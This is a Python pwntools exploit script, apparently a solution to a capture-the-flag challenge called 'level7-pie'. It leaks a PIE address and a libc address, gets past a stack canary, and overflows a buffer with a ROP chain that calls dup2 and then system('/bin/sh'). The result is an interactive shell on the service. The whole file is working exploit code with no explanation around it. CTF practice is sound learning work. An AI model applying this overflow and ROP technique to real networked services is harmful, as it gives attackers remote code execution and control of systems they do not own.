#! /usr/bin/env python
# -*- coding: utf-8 -*-
#
# Copyright © 2018 vam <jpwan21@gmail.com>

from pwn import *
context.log_level="debug"
pwn_file="./level7-pie"
elf=ELF(pwn_file)
libc=ELF("./libc-2.23.so")

#r=remote("pwn.sixstars.team",22007)
r=remote("0.0.0.0",0x2717)

detect = 'a'*0x40 + chr(0)+ chr(30)+ chr(124)+chr(9) + 'a'*(0x4c-0x44)
r.recv()

'''
to get pie_addr
'''
# get addr of level7
payload = detect + 'a'*4 +  chr(0x77)
r.sendline(payload)
level7_addr = r.recv()
print "level7_addr is: ", level7_addr
print len(level7_addr)
level7_addr = level7_addr[::-1]
level7_addr = level7_addr.encode('hex')
level7_addr = int(level7_addr, 16)
print hex(level7_addr)

text_addr = level7_addr - 0x1311
write_off = 0xf04
'''
to get libc addr
'''
r.close()
r = remote("0.0.0.0", 0x2717)
r.recv()

send_off = 0x3100
payload = detect + 'a'*4 + p32(text_addr+write_off) + p32(0x804897b) + p32(4) + p32(text_addr+ 0x3100)
r.sendline(payload)

base_str = r.recv()

word1 = base_str
print len(word1)
print '========'
word1 = word1[:4]
word1 = word1[::-1]
word1 = word1.encode('hex')
word1 = int(word1, 16)
print "the addr of recv is:",hex(word1)

r.close()
'''
to pwn
'''
r=remote("0.0.0.0", 0x2717)
r.recv()
#word1 = 0xf7607220
recv_addr = libc.sym['recv']
libc.address = word1 -recv_addr

sh_addr = list(libc.search("/bin/sh"))[0]
execve_addr = libc.sym["system"]
dup_addr = libc.sym['dup2']
print hex(dup_addr)
print '====='

payload2 = detect + 'a'*(0x4c-0x44) + 'a'*4
payload2+= p32(dup_addr)
payload2+= p32(0x8048FBA)
payload2+= p32(4)
payload2+= p32(0)
#payload2+= 'a'*4
payload2+= p32(dup_addr)
payload2+= p32(0x8048FBA)
payload2+= p32(4)
payload2+= p32(1)
#payload2+= 'a'*4
payload2+= p32(execve_addr)
payload2+= p32(0)
payload2+= p32(sh_addr)

print len(payload2)
r.sendline(payload2)
r.interactive()
